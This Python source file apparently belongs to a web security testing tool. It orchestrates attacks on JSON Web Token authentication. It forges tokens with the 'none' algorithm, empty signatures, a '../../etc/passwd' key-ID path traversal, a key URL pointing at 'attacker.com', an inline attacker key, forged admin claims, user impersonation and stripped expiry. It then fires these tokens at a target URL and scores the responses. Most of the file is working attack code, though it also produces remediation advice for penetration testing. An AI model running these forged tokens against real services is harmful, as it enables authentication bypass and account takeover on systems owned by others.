"""
JWT Attack Orchestrator
Main component that coordinates all JWT attack testing activities
"""

import asyncio
from datetime import datetime
from typing import Dict, List, Optional
import uuid

from core.logging import get_logger
from utils.jwt_utils import decode_jwt
from .jwt_attack_models import (
    AttackConfiguration, AttackResult, AttackSession, AttackSummary, 
    AttackType, BaselineResponse, VulnerabilityAssessment, VulnerabilitySeverity
)
from .jwt_attack_http_client import JWTAttackHTTPClient
from .jwt_attack_storage import AttackStorageManager
from .jwt_attack_response_analyzer import JWTAttackResponseAnalyzer


class JWTAttackOrchestrator:
    """
    Main orchestrator for JWT attack testing
    
    Coordinates:
    - Attack token generation
    - HTTP request execution
    - Response analysis
    - Result storage
    - Report generation
    """
    
    def __init__(self, target_url: str, original_token: str, 
                 custom_headers: Dict[str, str] = None, 
                 post_data: str = None, timeout: int = 30, 
                 verify_ssl: bool = True, max_retries: int = 3):
        """
        Initialize JWT attack orchestrator
        
        Args:
            target_url: Target URL for attack testing
            original_token: Original JWT token to use as base
            custom_headers: Additional headers for requests
            post_data: POST data for request bodies
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            max_retries: Maximum retry attempts for requests
        """
        self.target_url = target_url
        self.original_token = original_token
        self.custom_headers = custom_headers or {}
        self.post_data = post_data
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.max_retries = max_retries
        
        # Initialize components
        self.http_client = JWTAttackHTTPClient(
            base_url=target_url,
            custom_headers=custom_headers,
            timeout=timeout,
            verify_ssl=verify_ssl,
            max_retries=max_retries
        )
        
        self.storage_manager = AttackStorageManager()
        
        # Response analyzer will be initialized after baseline response
        self.response_analyzer: Optional[JWTAttackResponseAnalyzer] = None
        
        # Session state
        self.session: Optional[AttackSession] = None
        self.baseline_response: Optional[BaselineResponse] = None
        self.attack_results: List[AttackResult] = []
        
        self.logger = get_logger(__name__).bind(component="jwt_attack_orchestrator")
        
        # Validate original token
        try:
            self.decoded_token = decode_jwt(original_token)
            self.logger.info("JWT Attack Orchestrator initialized",
                           target_url=target_url,
                           token_algorithm=self.decoded_token['header'].get('alg', 'unknown'))
        except Exception as e:
            self.logger.error("Invalid JWT token provided", error=str(e))
            raise ValueError(f"Invalid JWT token: {str(e)}")
    
    async def execute_all_attacks(self) -> AttackSummary:
        """
        Execute all JWT attack vectors and return comprehensive results
        
        Returns:
            AttackSummary with complete results
        """
        self.logger.info("Starting comprehensive JWT attack testing")
        
        # Initialize session
        await self._initialize_session()
        
        try:
            # Test baseline request first
            self.logger.info("Testing baseline request with original token")
            self.baseline_response = await self.test_baseline_request()
            
            # Initialize response analyzer with baseline
            self.response_analyzer = JWTAttackResponseAnalyzer(self.baseline_response)
            
            # Save baseline response
            self.storage_manager.save_baseline_response(self.baseline_response)
            
            # Execute all attack vectors
            attack_vectors = [
                AttackType.ALG_NONE,
                AttackType.NULL_SIGNATURE,
                AttackType.KID_INJECTION,
                AttackType.JWKS_SPOOF,
                AttackType.INLINE_JWKS,
                AttackType.PRIVILEGE_ESCALATION,
                AttackType.USER_IMPERSONATION,
                AttackType.EXPIRATION_BYPASS
            ]
            
            for attack_type in attack_vectors:
                try:
                    self.logger.info("Executing attack vector", attack_type=attack_type.value)
                    attack_result = await self.execute_attack_vector(attack_type)
                    
                    if attack_result:
                        self.attack_results.append(attack_result)
                        self.storage_manager.save_attack_result(attack_result)
                        
                        # Update session statistics
                        self.session.total_attacks += 1
                        if attack_result.vulnerability_assessment.is_vulnerable:
                            self.session.successful_attacks += 1
                    
                except Exception as e:
                    self.logger.error("Attack vector failed",
                                    attack_type=attack_type.value,
                                    error=str(e))
            
            # Finalize session
            self.session.end_time = datetime.now()
            self.session.attack_results = self.attack_results
            
            # Generate summary and reports
            attack_summary = self._generate_attack_summary()
            
            # Save reports
            self.storage_manager.generate_attack_report(attack_summary)
            self.storage_manager.generate_human_readable_report(attack_summary)
            
            self.logger.info("JWT attack testing completed",
                           total_attacks=self.session.total_attacks,
                           successful_attacks=self.session.successful_attacks,
                           vulnerabilities_found=len(attack_summary.vulnerabilities_found))
            
            return attack_summary
            
        except Exception as e:
            self.logger.error("Attack testing failed", error=str(e))
            raise
        
        finally:
            # Cleanup
            await self.http_client.close()
    
    async def test_baseline_request(self) -> BaselineResponse:
        """
        Test original token to establish baseline behavior
        
        Returns:
            BaselineResponse with original token results
        """
        try:
            # Determine HTTP method based on POST data
            method = "POST" if self.post_data else "GET"
            
            # Send baseline request
            request_details, response_details = await self.http_client.send_baseline_request(
                jwt_token=self.original_token,
                post_data=self.post_data,
                method=method
            )
            
            baseline = BaselineResponse(
                request_details=request_details,
                response_details=response_details
            )
            
            self.logger.info("Baseline request completed",
                           status_code=response_details.status_code,
                           response_time=response_details.response_time)
            
            return baseline
            
        except Exception as e:
            self.logger.error("Baseline request failed", error=str(e))
            raise
    
    async def execute_attack_vector(self, attack_type: AttackType) -> Optional[AttackResult]:
        """
        Execute a specific attack vector
        
        Args:
            attack_type: Type of attack to execute
            
        Returns:
            AttackResult if successful, None if failed
        """
        try:
            # Generate attack token based on type
            attack_token = self._generate_attack_token(attack_type)
            
            if not attack_token:
                self.logger.warning("Failed to generate attack token",
                                  attack_type=attack_type.value)
                return None
            
            # Save attack token
            self.storage_manager.save_attack_token(attack_type, attack_token)
            
            # Determine HTTP method
            method = "POST" if self.post_data else "GET"
            
            # Send attack request
            request_details, response_details = await self.http_client.send_attack_request(
                jwt_token=attack_token,
                post_data=self.post_data,
                method=method
            )
            
            # Analyze response for vulnerabilities
            if self.response_analyzer:
                vulnerability_assessment = self.response_analyzer.analyze_attack_response(
                    response_details, attack_type
                )
            else:
                # Fallback to basic analysis if analyzer not initialized
                vulnerability_assessment = self._analyze_attack_response(
                    attack_type, response_details, self.baseline_response.response_details
                )
            
            # Create attack result
            attack_result = AttackResult(
                attack_type=attack_type,
                attack_variant="standard",
                jwt_token=attack_token,
                request_details=request_details,
                response_details=response_details,
                vulnerability_assessment=vulnerability_assessment,
                baseline_comparison=self._compare_with_baseline(response_details)
            )
            
            self.logger.debug("Attack vector completed",
                            attack_type=attack_type.value,
                            status_code=response_details.status_code,
                            is_vulnerable=vulnerability_assessment.is_vulnerable)
            
            return attack_result
            
        except Exception as e:
            self.logger.error("Attack vector execution failed",
                            attack_type=attack_type.value,
                            error=str(e))
            return None
    
    def _generate_attack_token(self, attack_type: AttackType) -> Optional[str]:
        """
        Generate malicious JWT token for specific attack type
        
        Args:
            attack_type: Type of attack vector
            
        Returns:
            Malicious JWT token string or None if generation failed
        """
        try:
            header = self.decoded_token['header'].copy()
            payload = self.decoded_token['payload'].copy()
            
            if attack_type == AttackType.ALG_NONE:
                # Algorithm confusion attack - set alg to "none"
                header['alg'] = 'none'
                # Create token without signature
                from utils.jwt_utils import base64url_encode
                import json
                
                header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
                payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
                
                return f"{header_encoded}.{payload_encoded}."
            
            elif attack_type == AttackType.NULL_SIGNATURE:
                # Null signature attack - empty signature
                from utils.jwt_utils import base64url_encode
                import json
                
                header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
                payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
                
                return f"{header_encoded}.{payload_encoded}."
            
            elif attack_type == AttackType.KID_INJECTION:
                # Key ID injection attack
                header['kid'] = '../../etc/passwd'
                from utils.jwt_utils import encode_jwt
                return encode_jwt(header, payload, "secret")
            
            elif attack_type == AttackType.JWKS_SPOOF:
                # JWKS spoofing attack
                header['jku'] = 'http://attacker.com/jwks.json'
                from utils.jwt_utils import encode_jwt
                return encode_jwt(header, payload, "secret")
            
            elif attack_type == AttackType.INLINE_JWKS:
                # Inline JWKS injection
                header['jwk'] = {
                    "kty": "RSA",
                    "kid": "attacker-key",
                    "use": "sig",
                    "n": "malicious_key_data",
                    "e": "AQAB"
                }
                from utils.jwt_utils import encode_jwt
                return encode_jwt(header, payload, "secret")
            
            elif attack_type == AttackType.PRIVILEGE_ESCALATION:
                # Modify role/admin claims
                payload['role'] = 'admin'
                payload['admin'] = True
                payload['is_admin'] = True
                from utils.jwt_utils import encode_jwt
                return encode_jwt(header, payload, "secret")
            
            elif attack_type == AttackType.USER_IMPERSONATION:
                # Change user identifier
                if 'sub' in payload:
                    payload['sub'] = 'admin'
                if 'user_id' in payload:
                    payload['user_id'] = '1'
                if 'username' in payload:
                    payload['username'] = 'admin'
                from utils.jwt_utils import encode_jwt
                return encode_jwt(header, payload, "secret")
            
            elif attack_type == AttackType.EXPIRATION_BYPASS:
                # Remove or extend expiration
                if 'exp' in payload:
                    del payload['exp']
                if 'iat' in payload:
                    del payload['iat']
                from utils.jwt_utils import encode_jwt
                return encode_jwt(header, payload, "secret")
            
            else:
                self.logger.warning("Unknown attack type", attack_type=attack_type.value)
                return None
                
        except Exception as e:
            self.logger.error("Token generation failed",
                            attack_type=attack_type.value,
                            error=str(e))
            return None
    
    def _analyze_attack_response(self, attack_type: AttackType, response_details, 
                               baseline_response) -> VulnerabilityAssessment:
        """
        Analyze attack response to determine if vulnerability exists
        
        Args:
            attack_type: Type of attack performed
            response_details: Response from attack request
            baseline_response: Baseline response for comparison
            
        Returns:
            VulnerabilityAssessment with analysis results
        """
        evidence = []
        exploitation_steps = []
        is_vulnerable = False
        confidence_score = 0.0
        severity = VulnerabilitySeverity.INFO
        
        # Compare status codes
        if response_details.status_code != baseline_response.status_code:
            evidence.append(f"Status code changed from {baseline_response.status_code} to {response_details.status_code}")
            
            # Success responses indicate potential vulnerability
            if 200 <= response_details.status_code < 300:
                is_vulnerable = True
                confidence_score = 0.8
                severity = VulnerabilitySeverity.HIGH
                evidence.append("Attack request returned success status code")
                exploitation_steps.append(f"Use {attack_type.value} attack token to bypass authentication")
        
        # Check for authentication bypass indicators
        if response_details.status_code == 200 and baseline_response.status_code in [401, 403]:
            is_vulnerable = True
            confidence_score = 0.9
            severity = VulnerabilitySeverity.CRITICAL
            evidence.append("Authentication bypass detected - unauthorized access granted")
            exploitation_steps.append("Replace JWT token with malicious variant to gain unauthorized access")
        
        # Check response content length differences
        content_diff = abs(response_details.content_length - baseline_response.content_length)
        if content_diff > 100:  # Significant content difference
            evidence.append(f"Response content length changed by {content_diff} bytes")
            if not is_vulnerable:
                confidence_score = 0.3  # Lower confidence for content changes alone
        
        # Check timing differences (potential blind vulnerabilities)
        time_diff = abs(response_details.response_time - baseline_response.response_time)
        if time_diff > 2.0:  # Significant timing difference
            evidence.append(f"Response time changed by {time_diff:.2f} seconds")
            if not is_vulnerable:
                confidence_score = 0.2  # Very low confidence for timing alone
        
        # Attack-specific analysis
        if attack_type in [AttackType.ALG_NONE, AttackType.NULL_SIGNATURE]:
            vulnerability_type = "Algorithm Confusion / Signature Bypass"
            remediation_advice = "Ensure JWT signature verification is properly implemented and cannot be bypassed"
        elif attack_type == AttackType.KID_INJECTION:
            vulnerability_type = "Key ID Injection"
            remediation_advice = "Validate and sanitize the 'kid' parameter to prevent path traversal attacks"
        elif attack_type in [AttackType.JWKS_SPOOF, AttackType.INLINE_JWKS]:
            vulnerability_type = "JWKS Manipulation"
            remediation_advice = "Use a trusted, static JWKS endpoint and validate key sources"
        elif attack_type in [AttackType.PRIVILEGE_ESCALATION, AttackType.USER_IMPERSONATION]:
            vulnerability_type = "Authorization Bypass"
            remediation_advice = "Implement proper JWT signature verification and claim validation"
        else:
            vulnerability_type = f"{attack_type.value} Vulnerability"
            remediation_advice = "Review JWT implementation for security vulnerabilities"
        
        return VulnerabilityAssessment(
            is_vulnerable=is_vulnerable,
            vulnerability_type=vulnerability_type,
            severity=severity,
            evidence=evidence,
            exploitation_steps=exploitation_steps,
            remediation_advice=remediation_advice,
            confidence_score=confidence_score
        )
    
    def _compare_with_baseline(self, response_details) -> Dict:
        """Compare attack response with baseline"""
        if not self.baseline_response:
            return {}
        
        baseline = self.baseline_response.response_details
        
        return {
            'status_code_diff': response_details.status_code - baseline.status_code,
            'content_length_diff': response_details.content_length - baseline.content_length,
            'response_time_diff': response_details.response_time - baseline.response_time,
            'baseline_status': baseline.status_code,
            'attack_status': response_details.status_code
        }
    
    async def _initialize_session(self) -> None:
        """Initialize attack testing session"""
        # Create session configuration
        config = AttackConfiguration(
            target_url=self.target_url,
            original_jwt=self.original_token,
            custom_headers=self.custom_headers,
            post_data=self.post_data,
            timeout=self.timeout,
            verify_ssl=self.verify_ssl,
            session_id=self.storage_manager.session_id
        )
        
        # Create session
        self.session = AttackSession(
            session_id=self.storage_manager.session_id,
            configuration=config
        )
        
        # Create storage directories
        self.storage_manager.create_session_directory()
        
        self.logger.info("Attack session initialized",
                       session_id=self.session.session_id)
    
    def _generate_attack_summary(self) -> AttackSummary:
        """Generate comprehensive attack summary"""
        vulnerabilities_found = []
        potential_vulnerabilities = []
        failed_attacks = []
        
        for result in self.attack_results:
            if result.vulnerability_assessment.is_vulnerable:
                if result.vulnerability_assessment.confidence_score >= 0.7:
                    vulnerabilities_found.append(result)
                else:
                    potential_vulnerabilities.append(result)
            else:
                failed_attacks.append(result)
        
        return AttackSummary(
            session=self.session,
            vulnerabilities_found=vulnerabilities_found,
            potential_vulnerabilities=potential_vulnerabilities,
            failed_attacks=failed_attacks
        )
    
    async def test_connectivity(self) -> bool:
        """Test connectivity to target URL"""
        return await self.http_client.test_connectivity()